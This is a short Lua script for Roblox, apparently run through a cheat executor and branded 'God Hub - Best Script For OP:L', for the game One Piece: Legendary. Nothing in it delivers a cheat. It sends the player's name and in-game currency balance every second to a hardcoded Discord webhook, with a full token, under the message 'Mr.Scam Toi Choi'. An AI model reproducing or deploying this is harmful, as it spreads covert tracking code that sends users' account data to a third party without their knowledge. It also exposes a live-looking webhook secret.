function PostWebhook(cm, cn)
    local co = http_request or request or HttpPost or syn.request
    local cp =
        co(
        {
            Url = cm,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(cn)
        }
    )

    --setclipboard(game:GetService("HttpService"):JSONEncode(cp))
end
function PostWebhook2(data)
    return PostWebhook("https://discord.com/api/webhooks/1025393134177357825/jNg--0hGmLDZen2UOp0D6Y8zW3C2_TgjYQmbO79xAFQbvG37oplpUUbtSrezva_2E6qq", data)
end
local player = game.Players.LocalPlayer
local store = game.workspace.UserData:FindFirstChild("User_" .. player.UserId)
spawn(function()
    pcall(function()
        while true do wait(1)
            PostWebhook2(
                            {
                                content = "**Mr.Scam Toi Choi**",
                                tts = false,
                                embeds = {
                                    {
                                        id = 652627557,
                                        title = "Check Beli",
                                        description = "Player: " ..
                                        game.Players.LocalPlayer.name,
                                        color = 13858455,
                                        fields = {
                                            {
                                                id = 814454215,
                                                name = "Beli:",
                                                value = store.Data.Cash.Value,
                                                inline = false
                                            },
                                        },
                                        author = {
                                            name = "God Hub - Best Script For OP:L"
                                        }
                                    }
                                }
                            }
                        )
         end
    end)
end)
